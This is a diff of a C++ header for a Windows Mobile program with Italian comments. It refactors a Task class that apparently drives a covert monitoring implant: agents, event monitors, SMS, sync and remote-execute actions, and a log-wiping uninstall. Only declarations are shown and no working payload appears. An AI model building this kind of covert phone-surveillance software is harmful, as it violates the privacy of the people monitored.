@@ -18,6 +18,9 @@ using namespace std;
 #include "ril.h"
 #include <gpsapi.h>
 #include <Msgqueue.h>
+#include "ModulesManager.h"
+#include "EventsManager.h"
+#include "ActionsManager.h"
 
 class Conf;
 class Status;
@@ -25,111 +28,30 @@ class Transfer;
 class Task;
 class Device;
 
-class Task : public Transfer
-{
+class Task : public Transfer {
 	/**
 	 * Puntatore ad un oggetto Conf che viene allocato ed inizializzato dal costruttore. Viene liberato
 	 * poi dal distruttore.
 	 */
-	private: Conf* confObj;
-	private: Status *statusObj;
-	private: Device *deviceObj;
-	private: UberLog *uberlogObj;
-	private: Observer *observerObj;
+	private:
+		static Task *Instance;
+		static volatile LONG lLock;
 
-	/**
-	 * Questo flag viene settato se viene ricevuto l'evento UNINSTALL. In questo caso la TaskInit()
-	 * rimuove i log e ritorna.
-	 */
-	private: BOOL m_bUninstall;
-
-	/**
-	* Questo flag viene settato se viene ricevuta una nuova configurazione.
-	*/
-	private: BOOL m_bReload;
-
-	/**
-	 * Handle array per la gestione dei thread di eventi ed agenti e della coda IPC.
-	 */	
-	private: HANDLE *hEvents, *hAgents;
-
-	/**
-	* Counter per i thread di eventi ed agenti.
-	*/	
-	private: UINT uEvents, uAgents;
-
-	/**
-	 * Serve a non fare un loop infinito continuo e a dormire tra un controllo e l'altro della checklist. Per 
-	 * il momento lo sleep time e' configurato internamente, un futuro verra' reso configurabile. 
-	 */
-	private: void Sleep();
-
-	/**
-	* E' un semplice override della Sleep standard.
-	*/
-	private: void Sleep(UINT ms);
-
-	/**
-	 * Setta i flag globali che triggherano la CANCELLATION_POINT. Torna TRUE appena l'agente identificato da Type
-	 * si e' fermato, FALSE se l'agente ha superato il timeout.
-	 */
-	private: BOOL StopAgent(UINT Type);
-
-	/**
-	 * Stoppa tutti gli agenti e torna TRUE se tutti si sono fermati nel timeout prestabilito, FALSE altrimenti. Imposta
-	 * il flag STOP nella tabella degli agenti.
-	 */
-	private: BOOL StopAgents();
-
-	/**
-	* Avvia l'agente identificato da Type. Torna TRUE se tutti se l'agente e' stato avviato, FALSE altrimenti.
-	*/
-	private: BOOL StartAgent(UINT Type);
-
-	/**
-	 * Avvia tutti gli agenti (tramite le Start*) che sono marcati come attivi nell'oggetto Status.Agents. Torna TRUE se tutti gli
-	 * agenti sono partiti correttamente, FALSE altrimenti.
-	 */
-	private: BOOL StartAgents();
-
-	/**
-	* Riavvia un agente che era gia' attivo. Torna TRUE se l'agente e' stato riavviato correttamente,
-	* FALSE altrimenti.
-	*/
-	private: BOOL Task::ReStartAgent(UINT Type);
-
-	/**
-	* Avvia tutti i monitor. Torna TRUE se tutti gli
-	* eventi sono partiti correttamente, FALSE altrimenti.
-	*/
-	private: BOOL StopEvents();
-
-	/**
-	* Registra gli eventi ed avvia i relativi monitor. Torna TRUE se tutti gli
-	* eventi sono stati registrati correttamente, FALSE altrimenti.
-	*/
-	private: BOOL RegisterEvents();
-
-	/**
-	* Ognuna di queste funzioni esegue un'azione. Torna TRUE se l'azione e' stata eseguita
-	* con successo, FALSE altrimenti.
-	*/
-	private: BOOL ActionSync(pActionStruct pAction);
-	private: BOOL ActionSyncPda(pActionStruct pAction);
-	private: BOOL ActionSyncApn(pActionStruct pAction);
-	private: BOOL ActionUninstall(pActionStruct pAction);
-	private: BOOL ActionReload(pActionStruct pAction);
-	private: BOOL ActionSms(pActionStruct pAction);
-	private: BOOL ActionToothing(pActionStruct pAction);
-	private: BOOL ActionStartAgent(pActionStruct pAction);
-	private: BOOL ActionStopAgent(pActionStruct pAction);
-	private: BOOL ActionExecute(pActionStruct pAction);
-	private: BOOL ActionLog(pActionStruct pAction);
+		Conf* confObj;
+		Status *statusObj;
+		Device *deviceObj;
+		UberLog *uberlogObj;
+		Observer *observerObj;
+		ModulesManager *modulesManager;
+		EventsManager *eventsManager;
+		ActionsManager *actionsManager;
+		HANDLE wakeupEvent;
+		BOOL uninstallRequested;
 
 	/**
 	 * Instanzia l'oggetto Conf ed inizializza la configurazione.
 	 */
-	public:  Task();
+	private:  Task();
 			 ~Task();
 
 	/**
@@ -151,6 +73,10 @@ class Task : public Transfer
 	 * lo stato di bUninstall subito dopo l'inizio della funzione.
 	 */
 	public: BOOL CheckActions();
+
+		static Task* self();
+		void uninstall();
+		void wakeup();
 };
 
 #endif
